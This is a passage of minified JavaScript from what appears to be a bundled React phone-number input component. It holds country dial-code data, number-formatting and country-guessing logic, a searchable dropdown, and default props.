"918", "503", "541", "215", "412", "570", "610", "717", "724", "814", "401", "803", "843", "864", "605", "423", "615", "731", "865", "901", "931", "210", "214", "254", "281", "325", "361", "409", "432", "512", "713", "806", "817", "830", "903", "915", "936", "940", "956", "972", "979", "435", "801", "276", "434", "540", "703", "757", "804", "802", "206", "253", "360", "425", "509", "262", "414", "608", "715", "920", "304", "307"]], ["Uruguay", ["america", "south-america"], "uy", "598"], ["Uzbekistan", ["asia", "ex-ussr"], "uz", "998", ".. ... .. .."], ["Vanuatu", ["oceania"], "vu", "678"], ["Vatican City", ["europe"], "va", "39", ".. .... ....", 1], ["Venezuela", ["america", "south-america"], "ve", "58"], ["Vietnam", ["asia"], "vn", "84"], ["Yemen", ["middle-east"], "ye", "967"], ["Zambia", ["africa"], "zm", "260"], ["Zimbabwe", ["africa"], "zw", "263"]]
      , Ae = [["American Samoa", ["oceania"], "as", "1684"], ["Anguilla", ["america", "carribean"], "ai", "1264"], ["Bermuda", ["america", "north-america"], "bm", "1441"], ["British Virgin Islands", ["america", "carribean"], "vg", "1284"], ["Cayman Islands", ["america", "carribean"], "ky", "1345"], ["Cook Islands", ["oceania"], "ck", "682"], ["Falkland Islands", ["america", "south-america"], "fk", "500"], ["Faroe Islands", ["europe"], "fo", "298"], ["Gibraltar", ["europe"], "gi", "350"], ["Greenland", ["america"], "gl", "299"], ["Jersey", ["europe", "eu-union"], "je", "44", ".... ......"], ["Montserrat", ["america", "carribean"], "ms", "1664"], ["Niue", ["asia"], "nu", "683"], ["Norfolk Island", ["oceania"], "nf", "672"], ["Northern Mariana Islands", ["oceania"], "mp", "1670"], ["Saint Barthélemy", ["america", "carribean"], "bl", "590", "", 1], ["Saint Helena", ["africa"], "sh", "290"], ["Saint Martin", ["america", "carribean"], "mf", "590", "", 2], ["Saint Pierre and Miquelon", ["america", "north-america"], "pm", "508"], ["Sint Maarten", ["america", "carribean"], "sx", "1721"], ["Tokelau", ["oceania"], "tk", "690"], ["Turks and Caicos Islands", ["america", "carribean"], "tc", "1649"], ["U.S. Virgin Islands", ["america", "carribean"], "vi", "1340"], ["Wallis and Futuna", ["oceania"], "wf", "681"]];
    function H(z, M, Y, ge, W) {
        return !Y || W ? z + "".padEnd(M.length, ".") + " " + ge : z + "".padEnd(M.length, ".") + " " + Y
    }
    function X(z, M, Y, ge, W) {
        var b, xe, ce = [];
        return xe = M === !0,
        [(b = []).concat.apply(b, o(z.map(function(Ne) {
            var $e = {
                name: Ne[0],
                regions: Ne[1],
                iso2: Ne[2],
                countryCode: Ne[3],
                dialCode: Ne[3],
                format: H(Y, Ne[3], Ne[4], ge, W),
                priority: Ne[5] || 0
            }
              , Ue = [];
            return Ne[6] && Ne[6].map(function(Ce) {
                var Me = function(tt) {
                    for (var Xe = 1; Xe < arguments.length; Xe++) {
                        var O = arguments[Xe] != null ? arguments[Xe] : {}
                          , U = Object.keys(O);
                        typeof Object.getOwnPropertySymbols == "function" && (U = U.concat(Object.getOwnPropertySymbols(O).filter(function(ae) {
                            return Object.getOwnPropertyDescriptor(O, ae).enumerable
                        }))),
                        U.forEach(function(ae) {
                            r(tt, ae, O[ae])
                        })
                    }
                    return tt
                }({}, $e);
                Me.dialCode = Ne[3] + Ce,
                Me.isAreaCode = !0,
                Me.areaCodeLength = Ce.length,
                Ue.push(Me)
            }),
            Ue.length > 0 ? ($e.mainCode = !0,
            xe || M.constructor.name === "Array" && M.includes(Ne[2]) ? ($e.hasAreaCodes = !0,
            [$e].concat(Ue)) : (ce = ce.concat(Ue),
            [$e])) : [$e]
        }))), ce]
    }
    function J(z, M, Y, ge) {
        if (Y !== null) {
            var W = Object.keys(Y)
              , b = Object.values(Y);
            W.forEach(function(xe, ce) {
                if (ge)
                    return z.push([xe, b[ce]]);
                var Ne = z.findIndex(function(Ue) {
                    return Ue[0] === xe
                });
                if (Ne === -1) {
                    var $e = [xe];
                    $e[M] = b[ce],
                    z.push($e)
                } else
                    z[Ne][M] = b[ce]
            })
        }
    }
    function Q(z, M) {
        return M.length === 0 ? z : z.map(function(Y) {
            var ge = M.findIndex(function(b) {
                return b[0] === Y[2]
            });
            if (ge === -1)
                return Y;
            var W = M[ge];
            return W[1] && (Y[4] = W[1]),
            W[3] && (Y[5] = W[3]),
            W[2] && (Y[6] = W[2]),
            Y
        })
    }
    var V = function z(M, Y, ge, W, b, xe, ce, Ne, $e, Ue, Ce, Me, tt, Xe) {
        u(this, z),
        this.filterRegions = function(q, de) {
            if (typeof q == "string") {
                var Re = q;
                return de.filter(function(ee) {
                    return ee.regions.some(function(oe) {
                        return oe === Re
                    })
                })
            }
            return de.filter(function(ee) {
                return q.map(function(oe) {
                    return ee.regions.some(function(De) {
                        return De === oe
                    })
                }).some(function(oe) {
                    return oe
                })
            })
        }
        ,
        this.sortTerritories = function(q, de) {
            var Re = [].concat(o(q), o(de));
            return Re.sort(function(ee, oe) {
                return ee.name < oe.name ? -1 : ee.name > oe.name ? 1 : 0
            }),
            Re
        }
        ,
        this.getFilteredCountryList = function(q, de, Re) {
            return q.length === 0 ? de : Re ? q.map(function(ee) {
                var oe = de.find(function(De) {
                    return De.iso2 === ee
                });
                if (oe)
                    return oe
            }).filter(function(ee) {
                return ee
            }) : de.filter(function(ee) {
                return q.some(function(oe) {
                    return oe === ee.iso2
                })
            })
        }
        ,
        this.localizeCountries = function(q, de, Re) {
            for (var ee = 0; ee < q.length; ee++)
                de[q[ee].iso2] !== void 0 ? q[ee].localName = de[q[ee].iso2] : de[q[ee].name] !== void 0 && (q[ee].localName = de[q[ee].name]);
            return Re || q.sort(function(oe, De) {
                return oe.localName < De.localName ? -1 : oe.localName > De.localName ? 1 : 0
            }),
            q
        }
        ,
        this.getCustomAreas = function(q, de) {
            for (var Re = [], ee = 0; ee < de.length; ee++) {
                var oe = JSON.parse(JSON.stringify(q));
                oe.dialCode += de[ee],
                Re.push(oe)
            }
            return Re
        }
        ,
        this.excludeCountries = function(q, de) {
            return de.length === 0 ? q : q.filter(function(Re) {
                return !de.includes(Re.iso2)
            })
        }
        ;
        var O = function(q, de, Re) {
            var ee = [];
            return J(ee, 1, q, !0),
            J(ee, 3, de),
            J(ee, 2, Re),
            ee
        }(Ne, $e, Ue)
          , U = Q(JSON.parse(JSON.stringify(Te)), O)
          , ae = Q(JSON.parse(JSON.stringify(Ae)), O)
          , je = Se(X(U, M, Me, tt, Xe), 2)
          , be = je[0]
          , _e = je[1];
        if (Y) {
            var Oe = Se(X(ae, M, Me, tt, Xe), 2)
              , Ke = Oe[0];
            Oe[1],
            be = this.sortTerritories(Ke, be)
        }
        ge && (be = this.filterRegions(ge, be)),
        this.onlyCountries = this.localizeCountries(this.excludeCountries(this.getFilteredCountryList(W, be, ce.includes("onlyCountries")), xe), Ce, ce.includes("onlyCountries")),
        this.preferredCountries = b.length === 0 ? [] : this.localizeCountries(this.getFilteredCountryList(b, be, ce.includes("preferredCountries")), Ce, ce.includes("preferredCountries")),
        this.hiddenAreaCodes = this.excludeCountries(this.getFilteredCountryList(W, _e), xe)
    }
      , le = function(z) {
        function M(W) {
            var b;
            u(this, M),
            (b = function(O, U) {
                return !U || d(U) !== "object" && typeof U != "function" ? h(O) : U
            }(this, N(M).call(this, W))).getProbableCandidate = C()(function(O) {
                return O && O.length !== 0 ? b.state.onlyCountries.filter(function(U) {
                    return P()(U.name.toLowerCase(), O.toLowerCase())
                }, h(h(b)))[0] : null
            }),
            b.guessSelectedCountry = C()(function(O, U, ae, je) {
                var be;
                if (b.props.enableAreaCodes === !1 && (je.some(function(Ke) {
                    if (P()(O, Ke.dialCode))
                        return ae.some(function(q) {
                            if (Ke.iso2 === q.iso2 && q.mainCode)
                                return be = q,
                                !0
                        }),
                        !0
                }),
                be))
                    return be;
                var _e = ae.find(function(Ke) {
                    return Ke.iso2 == U
                });
                if (O.trim() === "")
                    return _e;
                var Oe = ae.reduce(function(Ke, q) {
                    return P()(O, q.dialCode) && (q.dialCode.length > Ke.dialCode.length || q.dialCode.length === Ke.dialCode.length && q.priority < Ke.priority) ? q : Ke
                }, {
                    dialCode: "",
                    priority: 10001
                }, h(h(b)));
                return Oe.name ? Oe : _e
            }),
            b.updateCountry = function(O) {
                var U, ae = b.state.onlyCountries;
                (U = O.indexOf(0) >= "0" && O.indexOf(0) <= "9" ? ae.find(function(je) {
                    return je.dialCode == +O
                }) : ae.find(function(je) {
                    return je.iso2 == O
                })) && U.dialCode && b.setState({
                    selectedCountry: U,
                    formattedNumber: b.props.disableCountryCode ? "" : b.formatNumber(U.dialCode, U)
                })
            }
            ,
            b.scrollTo = function(O, U) {
                if (O) {
                    var ae = b.dropdownRef;
                    if (ae && document.body) {
                        var je = ae.offsetHeight
                          , be = ae.getBoundingClientRect().top + document.body.scrollTop
                          , _e = be + je
                          , Oe = O
                          , Ke = Oe.getBoundingClientRect()
                          , q = Oe.offsetHeight
                          , de = Ke.top + document.body.scrollTop
                          , Re = de + q
                          , ee = de - be + ae.scrollTop
                          , oe = je / 2 - q / 2;
                        if (b.props.enableSearch ? de < be + 32 : de < be)
                            U && (ee -= oe),
                            ae.scrollTop = ee;
                        else if (Re > _e) {
                            U && (ee += oe);
                            var De = je - q;
                            ae.scrollTop = ee - De
                        }
                    }
                }
            }
            ,
            b.scrollToTop = function() {
                var O = b.dropdownRef;
                O && document.body && (O.scrollTop = 0)
            }
            ,
            b.formatNumber = function(O, U) {
                if (!U)
                    return O;
                var ae, je = U.format, be = b.props, _e = be.disableCountryCode, Oe = be.enableAreaCodeStretch, Ke = be.enableLongNumbers, q = be.autoFormat;
                if (_e ? ((ae = je.split(" ")).shift(),
                ae = ae.join(" ")) : Oe && U.isAreaCode ? ((ae = je.split(" "))[1] = ae[1].replace(/\.+/, "".padEnd(U.areaCodeLength, ".")),
                ae = ae.join(" ")) : ae = je,
                !O || O.length === 0)
                    return _e ? "" : b.props.prefix;
                if (O && O.length < 2 || !ae || !q)
                    return _e ? O : b.props.prefix + O;
                var de, Re = w()(ae, function(ee, oe) {
                    if (ee.remainingText.length === 0)
                        return ee;
                    if (oe !== ".")
                        return {
                            formattedText: ee.formattedText + oe,
                            remainingText: ee.remainingText
                        };
                    var De, Pt = i(De = ee.remainingText) || a(De) || s(), ut = Pt[0], Lt = Pt.slice(1);
                    return {
                        formattedText: ee.formattedText + ut,
                        remainingText: Lt
                    }
                }, {
                    formattedText: "",
                    remainingText: O.split("")
                });
                return (de = Ke ? Re.formattedText + Re.remainingText.join("") : Re.formattedText).includes("(") && !de.includes(")") && (de += ")"),
                de
            }
            ,
            b.cursorToEnd = function() {
                var O = b.numberInputRef;
                if (document.activeElement === O) {
                    O.focus();
                    var U = O.value.length;
                    O.value.charAt(U - 1) === ")" && (U -= 1),
                    O.setSelectionRange(U, U)
                }
            }
            ,
            b.getElement = function(O) {
                return b["flag_no_".concat(O)]
            }
            ,
            b.getCountryData = function() {
                return b.state.selectedCountry ? {
                    name: b.state.selectedCountry.name || "",
                    dialCode: b.state.selectedCountry.dialCode || "",
                    countryCode: b.state.selectedCountry.iso2 || "",
                    format: b.state.selectedCountry.format || ""
                } : {}
            }
            ,
            b.handleFlagDropdownClick = function(O) {
                if (O.preventDefault(),
                b.state.showDropdown || !b.props.disabled) {
                    var U = b.state
                      , ae = U.preferredCountries
                      , je = U.onlyCountries
                      , be = U.selectedCountry
                      , _e = b.concatPreferredCountries(ae, je).findIndex(function(Oe) {
                        return Oe.dialCode === be.dialCode && Oe.iso2 === be.iso2
                    });
                    b.setState({
                        showDropdown: !b.state.showDropdown,
                        highlightCountryIndex: _e
                    }, function() {
                        b.state.showDropdown && b.scrollTo(b.getElement(b.state.highlightCountryIndex))
                    })
                }
            }
            ,
            b.handleInput = function(O) {
                var U = O.target.value
                  , ae = b.props
                  , je = ae.prefix
                  , be = ae.onChange
                  , _e = b.props.disableCountryCode ? "" : je
                  , Oe = b.state.selectedCountry
                  , Ke = b.state.freezeSelection;
                if (!b.props.countryCodeEditable) {
                    var q = je + (Oe.hasAreaCodes ? b.state.onlyCountries.find(function(at) {
                        return at.iso2 === Oe.iso2 && at.mainCode
                    }).dialCode : Oe.dialCode);
                    if (U.slice(0, q.length) !== q)
                        return
                }
                if (U === je)
                    return be && be("", b.getCountryData(), O, ""),
                    b.setState({
                        formattedNumber: ""
                    });
                if (!(U.replace(/\D/g, "").length > 15 && (b.props.enableLongNumbers === !1 || typeof b.props.enableLongNumbers == "number" && U.replace(/\D/g, "").length > b.props.enableLongNumbers)) && U !== b.state.formattedNumber) {
                    O.preventDefault ? O.preventDefault() : O.returnValue = !1;
                    var de = b.props.country
                      , Re = b.state
                      , ee = Re.onlyCountries
                      , oe = Re.selectedCountry
                      , De = Re.hiddenAreaCodes;
                    if (be && O.persist(),
                    U.length > 0) {
                        var Pt = U.replace(/\D/g, "");
                        (!b.state.freezeSelection || oe && oe.dialCode.length > Pt.length) && (Oe = b.props.disableCountryGuess ? oe : b.guessSelectedCountry(Pt.substring(0, 6), de, ee, De) || oe,
                        Ke = !1),
                        _e = b.formatNumber(Pt, Oe),
                        Oe = Oe.dialCode ? Oe : oe
                    }
                    var ut = O.target.selectionStart
                      , Lt = O.target.selectionStart
                      , St = b.state.formattedNumber
                      , mn = _e.length - St.length;
                    b.setState({
                        formattedNumber: _e,
                        freezeSelection: Ke,
                        selectedCountry: Oe
                    }, function() {
                        mn > 0 && (Lt -= mn),
                        _e.charAt(_e.length - 1) == ")" ? b.numberInputRef.setSelectionRange(_e.length - 1, _e.length - 1) : Lt > 0 && St.length >= _e.length ? b.numberInputRef.setSelectionRange(Lt, Lt) : ut < St.length && b.numberInputRef.setSelectionRange(ut, ut),
                        be && be(_e.replace(/[^0-9]+/g, ""), b.getCountryData(), O, _e)
                    })
                }
            }
            ,
            b.handleInputClick = function(O) {
                b.setState({
                    showDropdown: !1
                }),
                b.props.onClick && b.props.onClick(O, b.getCountryData())
            }
            ,
            b.handleDoubleClick = function(O) {
                var U = O.target.value.length;
                O.target.setSelectionRange(0, U)
            }
            ,
            b.handleFlagItemClick = function(O, U) {
                var ae = b.state.selectedCountry
                  , je = b.state.onlyCountries.find(function(Ke) {
                    return Ke == O
                });
                if (je) {
                    var be = b.state.formattedNumber.replace(" ", "").replace("(", "").replace(")", "").replace("-", "")
                      , _e = be.length > 1 ? be.replace(ae.dialCode, je.dialCode) : je.dialCode
                      , Oe = b.formatNumber(_e.replace(/\D/g, ""), je);
                    b.setState({
                        showDropdown: !1,
                        selectedCountry: je,
                        freezeSelection: !0,
                        formattedNumber: Oe,
                        searchValue: ""
                    }, function() {
                        b.cursorToEnd(),
                        b.props.onChange && b.props.onChange(Oe.replace(/[^0-9]+/g, ""), b.getCountryData(), U, Oe)
                    })
                }
            }
            ,
            b.handleInputFocus = function(O) {
                b.numberInputRef && b.numberInputRef.value === b.props.prefix && b.state.selectedCountry && !b.props.disableCountryCode && b.setState({
                    formattedNumber: b.props.prefix + b.state.selectedCountry.dialCode
                }, function() {
                    b.props.jumpCursorToEnd && setTimeout(b.cursorToEnd, 0)
                }),
                b.setState({
                    placeholder: ""
                }),
                b.props.onFocus && b.props.onFocus(O, b.getCountryData()),
                b.props.jumpCursorToEnd && setTimeout(b.cursorToEnd, 0)
            }
            ,
            b.handleInputBlur = function(O) {
                O.target.value || b.setState({
                    placeholder: b.props.placeholder
                }),
                b.props.onBlur && b.props.onBlur(O, b.getCountryData())
            }
            ,
            b.handleInputCopy = function(O) {
                if (b.props.copyNumbersOnly) {
                    var U = window.getSelection().toString().replace(/[^0-9]+/g, "");
                    O.clipboardData.setData("text/plain", U),
                    O.preventDefault()
                }
            }
            ,
            b.getHighlightCountryIndex = function(O) {
                var U = b.state.highlightCountryIndex + O;
                return U < 0 || U >= b.state.onlyCountries.length + b.state.preferredCountries.length ? U - O : b.props.enableSearch && U > b.getSearchFilteredCountries().length ? 0 : U
            }
            ,
            b.searchCountry = function() {
                var O = b.getProbableCandidate(b.state.queryString) || b.state.onlyCountries[0]
                  , U = b.state.onlyCountries.findIndex(function(ae) {
                    return ae == O
                }) + b.state.preferredCountries.length;
                b.scrollTo(b.getElement(U), !0),
                b.setState({
                    queryString: "",
                    highlightCountryIndex: U
                })
            }
            ,
            b.handleKeydown = function(O) {
                var U = b.props.keys
                  , ae = O.target.className;
                if (ae.includes("selected-flag") && O.which === U.ENTER && !b.state.showDropdown)
                    return b.handleFlagDropdownClick(O);
                if (ae.includes("form-control") && (O.which === U.ENTER || O.which === U.ESC))
                    return O.target.blur();
                if (b.state.showDropdown && !b.props.disabled && (!ae.includes("search-box") || O.which === U.UP || O.which === U.DOWN || O.which === U.ENTER || O.which === U.ESC && O.target.value === "")) {
                    O.preventDefault ? O.preventDefault() : O.returnValue = !1;
                    var je = function(be) {
                        b.setState({
                            highlightCountryIndex: b.getHighlightCountryIndex(be)
                        }, function() {
                            b.scrollTo(b.getElement(b.state.highlightCountryIndex), !0)
                        })
                    };
                    switch (O.which) {
                    case U.DOWN:
                        je(1);
                        break;
                    case U.UP:
                        je(-1);
                        break;
                    case U.ENTER:
                        b.props.enableSearch ? b.handleFlagItemClick(b.getSearchFilteredCountries()[b.state.highlightCountryIndex] || b.getSearchFilteredCountries()[0], O) : b.handleFlagItemClick([].concat(o(b.state.preferredCountries), o(b.state.onlyCountries))[b.state.highlightCountryIndex], O);
                        break;
                    case U.ESC:
                    case U.TAB:
                        b.setState({
                            showDropdown: !1
                        }, b.cursorToEnd);
                        break;
                    default:
                        (O.which >= U.A && O.which <= U.Z || O.which === U.SPACE) && b.setState({
                            queryString: b.state.queryString + String.fromCharCode(O.which)
                        }, b.state.debouncedQueryStingSearcher)
                    }
                }
            }
            ,
            b.handleInputKeyDown = function(O) {
                var U = b.props
                  , ae = U.keys
                  , je = U.onEnterKeyPress
                  , be = U.onKeyDown;
                O.which === ae.ENTER && je && je(O),
                be && be(O)
            }
            ,
            b.handleClickOutside = function(O) {
                b.dropdownRef && !b.dropdownContainerRef.contains(O.target) && b.state.showDropdown && b.setState({
                    showDropdown: !1
                })
            }
            ,
            b.handleSearchChange = function(O) {
                var U = O.currentTarget.value
                  , ae = b.state
                  , je = ae.preferredCountries
                  , be = ae.selectedCountry
                  , _e = 0;
                if (U === "" && be) {
                    var Oe = b.state.onlyCountries;
                    _e = b.concatPreferredCountries(je, Oe).findIndex(function(Ke) {
                        return Ke == be
                    }),
                    setTimeout(function() {
                        return b.scrollTo(b.getElement(_e))
                    }, 100)
                }
                b.setState({
                    searchValue: U,
                    highlightCountryIndex: _e
                })
            }
            ,
            b.concatPreferredCountries = function(O, U) {
                return O.length > 0 ? o(new Set(O.concat(U))) : U
            }
            ,
            b.getDropdownCountryName = function(O) {
                return O.localName || O.name
            }
            ,
            b.getSearchFilteredCountries = function() {
                var O = b.state
                  , U = O.preferredCountries
                  , ae = O.onlyCountries
                  , je = O.searchValue
                  , be = b.props.enableSearch
                  , _e = b.concatPreferredCountries(U, ae)
                  , Oe = je.trim().toLowerCase().replace("+", "");
                if (be && Oe) {
                    if (/^\d+$/.test(Oe))
                        return _e.filter(function(de) {
                            var Re = de.dialCode;
                            return ["".concat(Re)].some(function(ee) {
                                return ee.toLowerCase().includes(Oe)
                            })
                        });
                    var Ke = _e.filter(function(de) {
                        var Re = de.iso2;
                        return ["".concat(Re)].some(function(ee) {
                            return ee.toLowerCase().includes(Oe)
                        })
                    })
                      , q = _e.filter(function(de) {
                        var Re = de.name
                          , ee = de.localName;
                        return de.iso2,
                        ["".concat(Re), "".concat(ee || "")].some(function(oe) {
                            return oe.toLowerCase().includes(Oe)
                        })
                    });
                    return b.scrollToTop(),
                    o(new Set([].concat(Ke, q)))
                }
                return _e
            }
            ,
            b.getCountryDropdownList = function() {
                var O = b.state
                  , U = O.preferredCountries
                  , ae = O.highlightCountryIndex
                  , je = O.showDropdown
                  , be = O.searchValue
                  , _e = b.props
                  , Oe = _e.disableDropdown
                  , Ke = _e.prefix
                  , q = b.props
                  , de = q.enableSearch
                  , Re = q.searchNotFound
                  , ee = q.disableSearchIcon
                  , oe = q.searchClass
                  , De = q.searchStyle
                  , Pt = q.searchPlaceholder
                  , ut = q.autocompleteSearch
                  , Lt = b.getSearchFilteredCountries().map(function(at, L) {
                    var ne = ae === L
                      , wt = $()({
                        country: !0,
                        preferred: at.iso2 === "us" || at.iso2 === "gb",
                        active: at.iso2 === "us",
                        highlight: ne
                    })
                      , ct = "flag ".concat(at.iso2);
                    return x.a.createElement("li", Object.assign({
                        ref: function(mt) {
                            return b["flag_no_".concat(L)] = mt
                        },
                        key: "flag_no_".concat(L),
                        "data-flag-key": "flag_no_".concat(L),
                        className: wt,
                        "data-dial-code": "1",
                        tabIndex: Oe ? "-1" : "0",
                        "data-country-code": at.iso2,
                        onClick: function(mt) {
                            return b.handleFlagItemClick(at, mt)
                        },
                        role: "option"
                    }, ne ? {
                        "aria-selected": !0
                    } : {}), x.a.createElement("div", {
                        className: ct
                    }), x.a.createElement("span", {
                        className: "country-name"
                    }, b.getDropdownCountryName(at)), x.a.createElement("span", {
                        className: "dial-code"
                    }, at.format ? b.formatNumber(at.dialCode, at) : Ke + at.dialCode))
                })
                  , St = x.a.createElement("li", {
                    key: "dashes",
                    className: "divider"
                });
                U.length > 0 && (!de || de && !be.trim()) && Lt.splice(U.length, 0, St);
                var mn = $()(r({
                    "country-list": !0,
                    hide: !je
                }, b.props.dropdownClass, !0));
                return x.a.createElement("ul", {
                    ref: function(at) {
                        return !de && at && at.focus(),
                        b.dropdownRef = at
                    },
                    className: mn,
                    style: b.props.dropdownStyle,
                    role: "listbox",
                    tabIndex: "0"
                }, de && x.a.createElement("li", {
                    className: $()(r({
                        search: !0
                    }, oe, oe))
                }, !ee && x.a.createElement("span", {
                    className: $()(r({
                        "search-emoji": !0
                    }, "".concat(oe, "-emoji"), oe)),
                    role: "img",
                    "aria-label": "Magnifying glass"
                }, "🔎"), x.a.createElement("input", {
                    className: $()(r({
                        "search-box": !0
                    }, "".concat(oe, "-box"), oe)),
                    style: De,
                    type: "search",
                    placeholder: Pt,
                    autoFocus: !0,
                    autoComplete: ut ? "on" : "off",
                    value: be,
                    onChange: b.handleSearchChange
                })), Lt.length > 0 ? Lt : x.a.createElement("li", {
                    className: "no-entries-message"
                }, x.a.createElement("span", null, Re)))
            }
            ;
            var xe, ce = new V(W.enableAreaCodes,W.enableTerritories,W.regions,W.onlyCountries,W.preferredCountries,W.excludeCountries,W.preserveOrder,W.masks,W.priority,W.areaCodes,W.localization,W.prefix,W.defaultMask,W.alwaysDefaultMask), Ne = ce.onlyCountries, $e = ce.preferredCountries, Ue = ce.hiddenAreaCodes, Ce = W.value ? W.value.replace(/\D/g, "") : "";
            xe = W.disableInitialCountryGuess ? 0 : Ce.length > 1 ? b.guessSelectedCountry(Ce.substring(0, 6), W.country, Ne, Ue) || 0 : W.country && Ne.find(function(O) {
                return O.iso2 == W.country
            }) || 0;
            var Me, tt = Ce.length < 2 && xe && !P()(Ce, xe.dialCode) ? xe.dialCode : "";
            Me = Ce === "" && xe === 0 ? "" : b.formatNumber((W.disableCountryCode ? "" : tt) + Ce, xe.name ? xe : void 0);
            var Xe = Ne.findIndex(function(O) {
                return O == xe
            });
            return b.state = {
                showDropdown: W.showDropdown,
                formattedNumber: Me,
                onlyCountries: Ne,
                preferredCountries: $e,
                hiddenAreaCodes: Ue,
                selectedCountry: xe,
                highlightCountryIndex: Xe,
                queryString: "",
                freezeSelection: !1,
                debouncedQueryStingSearcher: p()(b.searchCountry, 250),
                searchValue: ""
            },
            b
        }
        var Y, ge;
        return function(W, b) {
            if (typeof b != "function" && b !== null)
                throw new TypeError("Super expression must either be null or a function");
            W.prototype = Object.create(b && b.prototype, {
                constructor: {
                    value: W,
                    writable: !0,
                    configurable: !0
                }
            }),
            b && y(W, b)
        }(M, z),
        Y = M,
        (ge = [{
            key: "componentDidMount",
            value: function() {
                document.addEventListener && this.props.enableClickOutside && document.addEventListener("mousedown", this.handleClickOutside),
                this.props.onMount && this.props.onMount(this.state.formattedNumber.replace(/[^0-9]+/g, ""), this.getCountryData(), this.state.formattedNumber)
            }
        }, {
            key: "componentWillUnmount",
            value: function() {
                document.removeEventListener && this.props.enableClickOutside && document.removeEventListener("mousedown", this.handleClickOutside)
            }
        }, {
            key: "componentDidUpdate",
            value: function(W, b, xe) {
                W.country !== this.props.country ? this.updateCountry(this.props.country) : W.value !== this.props.value && this.updateFormattedNumber(this.props.value)
            }
        }, {
            key: "updateFormattedNumber",
            value: function(W) {
                if (W === null)
                    return this.setState({
                        selectedCountry: 0,
                        formattedNumber: ""
                    });
                var b = this.state
                  , xe = b.onlyCountries
                  , ce = b.selectedCountry
                  , Ne = b.hiddenAreaCodes
                  , $e = this.props
                  , Ue = $e.country
                  , Ce = $e.prefix;
                if (W === "")
                    return this.setState({
                        selectedCountry: ce,
                        formattedNumber: ""
                    });
                var Me, tt, Xe = W.replace(/\D/g, "");
                if (ce && P()(W, Ce + ce.dialCode))
                    tt = this.formatNumber(Xe, ce),
                    this.setState({
                        formattedNumber: tt
                    });
                else {
                    var O = (Me = this.props.disableCountryGuess ? ce : this.guessSelectedCountry(Xe.substring(0, 6), Ue, xe, Ne) || ce) && P()(Xe, Ce + Me.dialCode) ? Me.dialCode : "";
                    tt = this.formatNumber((this.props.disableCountryCode ? "" : O) + Xe, Me || void 0),
                    this.setState({
                        selectedCountry: Me,
                        formattedNumber: tt
                    })
                }
            }
        }, {
            key: "render",
            value: function() {
                var W, b, xe, ce = this, Ne = this.state, $e = Ne.onlyCountries, Ue = Ne.selectedCountry, Ce = Ne.showDropdown, Me = Ne.formattedNumber, tt = Ne.hiddenAreaCodes, Xe = this.props, O = Xe.disableDropdown, U = Xe.renderStringAsFlag, ae = Xe.isValid, je = Xe.defaultErrorMessage, be = Xe.specialLabel;
                if (typeof ae == "boolean")
                    b = ae;
                else {
                    var _e = ae(Me.replace(/\D/g, ""), Ue, $e, tt);
                    typeof _e == "boolean" ? (b = _e) === !1 && (xe = je) : (b = !1,
                    xe = _e)
                }
                var Oe = $()((r(W = {}, this.props.containerClass, !0),
                r(W, "react-tel-input", !0),
                W))
                  , Ke = $()({
                    arrow: !0,
                    up: Ce
                })
                  , q = $()(r({
                    "form-control": !0,
                    "invalid-number": !b,
                    open: Ce
                }, this.props.inputClass, !0))
                  , de = $()({
                    "selected-flag": !0,
                    open: Ce
                })
                  , Re = $()(r({
                    "flag-dropdown": !0,
                    "invalid-number": !b,
                    open: Ce
                }, this.props.buttonClass, !0))
                  , ee = "flag ".concat(Ue && Ue.iso2);
                return x.a.createElement("div", {
                    className: "".concat(Oe, " ").concat(this.props.className),
                    style: this.props.style || this.props.containerStyle,
                    onKeyDown: this.handleKeydown
                }, be && x.a.createElement("div", {
                    className: "special-label"
                }, be), xe && x.a.createElement("div", {
                    className: "invalid-number-message"
                }, xe), x.a.createElement("input", Object.assign({
                    className: q,
                    style: this.props.inputStyle,
                    onChange: this.handleInput,
                    onClick: this.handleInputClick,
                    onDoubleClick: this.handleDoubleClick,
                    onFocus: this.handleInputFocus,
                    onBlur: this.handleInputBlur,
                    onCopy: this.handleInputCopy,
                    value: Me,
                    onKeyDown: this.handleInputKeyDown,
                    placeholder: this.props.placeholder,
                    disabled: this.props.disabled,
                    type: "tel"
                }, this.props.inputProps, {
                    ref: function(oe) {
                        ce.numberInputRef = oe,
                        typeof ce.props.inputProps.ref == "function" ? ce.props.inputProps.ref(oe) : typeof ce.props.inputProps.ref == "object" && (ce.props.inputProps.ref.current = oe)
                    }
                })), x.a.createElement("div", {
                    className: Re,
                    style: this.props.buttonStyle,
                    ref: function(oe) {
                        return ce.dropdownContainerRef = oe
                    }
                }, U ? x.a.createElement("div", {
                    className: de
                }, U) : x.a.createElement("div", {
                    onClick: O ? void 0 : this.handleFlagDropdownClick,
                    className: de,
                    title: Ue ? "".concat(Ue.localName || Ue.name, ": + ").concat(Ue.dialCode) : "",
                    tabIndex: O ? "-1" : "0",
                    role: "button",
                    "aria-haspopup": "listbox",
                    "aria-expanded": !!Ce || void 0
                }, x.a.createElement("div", {
                    className: ee
                }, !O && x.a.createElement("div", {
                    className: Ke
                }))), Ce && this.getCountryDropdownList()))
            }
        }]) && c(Y.prototype, ge),
        M
    }(x.a.Component);
    le.defaultProps = {
        country: "",
        value: "",
        onlyCountries: [],
        preferredCountries: [],
        excludeCountries: [],
        placeholder: "1 (702) 123-4567",
        searchPlaceholder: "search",
        searchNotFound: "No entries to show",
        flagsImagePath: "./flags.png",
        disabled: !1,
        containerStyle: {},
        inputStyle: {},
        buttonStyle: {},
        dropdownStyle: {},
        searchStyle: {},
        containerClass: "",
        inputClass: "",
        buttonClass: "",
        dropdownClass: "",
        searchClass: "",
        className: "",
        autoFormat: !0,
        enableAreaCodes: !1,
        enableTerritories: !1,
        disableCountryCode: !1,
        disableDropdown: !1,
        enableLongNumbers: !1,
        countryCodeEditable: !0,
        enableSearch: !1,
        disableSearchIcon: !1,
        disableInitialCountryGuess: !1,
        disableCountryGuess: !1,
        regions: "",
        inputProps: {},
        localization: {},
        masks: null,
        priority: null,
        areaCodes: null,
        preserveOrder: [],
        defaultMask: "... ... ... ... ..",
        alwaysDefaultMask: !1,
        prefix: "+",
        copyNumbersOnly: !0,
        renderStringAsFlag: "",
        autocompleteSearch: !1,
        jumpCursorToEnd: !0,
        enableAreaCodeStretch: !1,
        enableClickOutside: !0,
        showDropdown: !1,
        isValid: !0,
        defaultErrorMessage: "",
        specialLabel: "Phone",
        onEnterKeyPress: null,
        keys: {
            UP: 38,
            DOWN: 40,
            RIGHT: 39,
            LEFT: 37,
            ENTER: 13,
            ESC: 27,
            PLUS: 43,
            A: 65,
            Z: 90,
